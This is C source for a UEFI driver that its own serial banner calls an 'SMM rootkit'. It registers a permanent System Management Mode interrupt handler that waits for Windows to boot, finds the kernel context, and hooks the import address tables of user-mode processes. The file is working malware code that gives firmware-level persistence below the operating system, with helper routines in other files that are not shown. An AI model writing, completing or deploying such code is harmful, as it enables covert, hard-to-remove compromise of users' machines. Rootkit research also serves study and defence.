// Basic UEFI Libraries
#include <Uefi.h>

// Protocols
#include <Protocol/SmmCpu.h>
#include <Protocol/SmmBase2.h>
#include <Protocol/SmmSwDispatch2.h>
#include <Protocol/Cpu.h>
#include <Protocol/SerialIo.h>
#include <Library/PcdLib.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/IoLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Protocol/PciIo.h>
#include <Library/PciLib.h>

// Our includes
#include "MemoryMapUEFI.h"
#include "TimerRTC.h"
#include "serial.h"
#include "WinUmdIATHook.h"
#include "Memory.h"
#include "WinTools.h"

EFI_CPU_ARCH_PROTOCOL *mCpu = NULL;
EFI_SMM_SYSTEM_TABLE2 *gSmst2 = NULL;

// UEFI Tables (will be gone after exiting DXE stage)
EFI_SYSTEM_TABLE *lST = NULL;
EFI_BOOT_SERVICES *lBS = NULL;     // used by MemoryMapUEFI.c
EFI_RUNTIME_SERVICES *lRT = NULL;

// NTKernelTools.c
extern WinCtx *winGlobal;

// System initialization vars
UINT32 SystemStartTime;
UINT32 SystemUptime;
BOOLEAN SystemInitOS;

VOID SmmCallHandle()
{
  if (!SystemInitOS)
  {
    // try to grab the windows Context
    SystemInitOS = InitGlobalWindowsContext();
    // give more time if it still failed
    if (!SystemInitOS)
    {
      SystemStartTime = SystemUptime;
      return;
    }
  }

  // if the context has been initialized
  WindowsUmdIATHook();

  return;
}

EFI_STATUS EFIAPI SmmHandler(IN EFI_HANDLE DispatchHandle, IN CONST VOID *Context OPTIONAL, IN OUT VOID *CommBuffer OPTIONAL, IN OUT UINTN *CommBufferSize OPTIONAL)
{
  // if the OS has not been initialized
  if (!SystemInitOS)
  {
    // count if the OS SHOULD be initialized
    UINT16 TimeSinceLastSMI = CmosGetCurrentTime();

    // Did we overflow? This happens once every hour
    if (TimeSinceLastSMI < SystemUptime)
      SystemUptime += TimeSinceLastSMI;
    else
      SystemUptime = TimeSinceLastSMI;

    // ctx not initialized and system hasn't booted completely
    if (SystemUptime - SystemStartTime < 10)
    {
      return EFI_SUCCESS;
    }
  }

  SerialPortInitialize(SERIAL_PORT_0, SERIAL_BAUDRATE);
  SmmCallHandle();
  return EFI_SUCCESS;
}

EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
{
  // Write to serial port
  SerialPortInitialize(SERIAL_PORT_0, SERIAL_BAUDRATE);
  SerialPrintString("\r\n");
  SerialPrintString("--------------------------------------------\r\n");
  SerialPrintString("|                                          |\r\n");
  SerialPrintString("|          S M M    R O O T K I T          |\r\n");
  SerialPrintString("|                                          |\r\n");
  SerialPrintString("|    shoutout to   rainbowrawr, Cr4sh,     |\r\n");
  SerialPrintString("|   ufrisk, Heep042, authors of LongKit    |\r\n");
  SerialPrintString("|                                          |\r\n");
  SerialPrintString("--------------------------------------------\r\n");
  SerialPrintString("\r\n");

  // Save the system tables etc. in global variable for further usage (currently not used)
  lST = SystemTable;
  lBS = SystemTable->BootServices;
  lRT = SystemTable->RuntimeServices;

  EFI_STATUS res;
  EFI_SMM_BASE2_PROTOCOL *SmmBase2;

  EFI_GUID SmmBase2Guid = EFI_SMM_BASE2_PROTOCOL_GUID;

  // need EFI_SMM_BASE2_PROTOCOL
  if ((res = SystemTable->BootServices->LocateProtocol(&SmmBase2Guid, NULL, (void **)&SmmBase2)) != EFI_SUCCESS)
  {
    SerialPrintString("Could not locate SmmBase2 protocol!\r\n");
    return res;
  }

  // get EFI_SMM_SYSTEM_TABLE2 in global var
  if ((res = SmmBase2->GetSmstLocation(SmmBase2, &gSmst2)) != EFI_SUCCESS)
  {
    SerialPrintString("Could not locate SMST!\r\n");
    return res;
  }

  if ((res = SystemTable->BootServices->LocateProtocol(&gEfiCpuArchProtocolGuid, NULL, (void **)&mCpu)) != EFI_SUCCESS)
  {
    SerialPrintString("Could not locate EfiCpuArch protocol!\r\n");
    return res;
  }

  // Register SMM Root Handler, discard the returning handle (we never unload the handler)
  EFI_HANDLE hSmmHandler;
  if ((res = gSmst2->SmiHandlerRegister(&SmmHandler, NULL, &hSmmHandler)) != EFI_SUCCESS)
  {
    return res;
  }

  // Initialize the virtual memory map for UEFI
  SerialPrintStringDebug("Initializing UEFI Memory Map \r\n");
  if (!InitUefiMemoryMap())
  {
    SerialPrintString("Failed dumping Memory Map for UEFI \r\n");
    return EFI_ERROR_MAJOR;
  }
  SerialPrintStringDebug("Successfully dumped Memory Map \r\n");

  SerialPrintStringDebug("Memory Map at: 0x");
  SerialPrintNumberDebug((UINT64)GetUefiMemoryMap(), 16);
  SerialPrintStringDebug("\r\n");

  // Allocate memory for windows context.
  // This is allocated straight as a page
  // to prevent our cheap malloc trashing it
  EFI_PHYSICAL_ADDRESS physAddr;
  gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &physAddr);
  winGlobal = (WinCtx *)physAddr;
  SerialPrintStringDebug("WinGlobal: 0x");
  SerialPrintNumberDebug((UINT64)winGlobal, 16);
  SerialPrintStringDebug("\r\n");

  // Set the start time of the PC
  SystemStartTime = CmosGetCurrentTime();
  SystemUptime = SystemStartTime;
  SerialPrintStringDebug("Start time was: ");
  SerialPrintNumberDebug(SystemStartTime, 10);
  SerialPrintStringDebug("\r\n");

  // Initialize our own heap with some memory to be used
  if (InitMemManager(100))
  {
    SerialPrintStringDebug("memory manager successfully initialized!\r\n");
  }

  // Initialize the os ctx value, so no useless
  // probing is done while the OS hasn't even booted
  SystemInitOS = FALSE;

  // Initialize the UMD IAT Hooking state
  InitWindowsUmdIATHook();

  return EFI_SUCCESS;
}